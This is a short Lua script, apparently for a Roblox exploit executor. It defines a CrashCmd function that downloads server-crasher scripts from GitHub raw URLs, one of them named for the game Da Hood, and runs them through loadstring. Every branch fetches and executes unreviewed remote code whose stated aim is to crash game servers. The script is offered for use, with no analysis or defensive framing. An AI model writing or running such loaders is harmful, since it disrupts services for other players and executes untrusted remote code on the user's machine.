if CRASH_LOADED == true then return end
getgenv().CRASH_LOADED = true

function CrashCmd(_type_)
    if _type_:lower() == "swag" then
        loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
    elseif _type_:lower() == "encrypt" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/dahoodcrasher.lua"))()
    else
        loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/dahoodcrasher.lua"))()
    end
end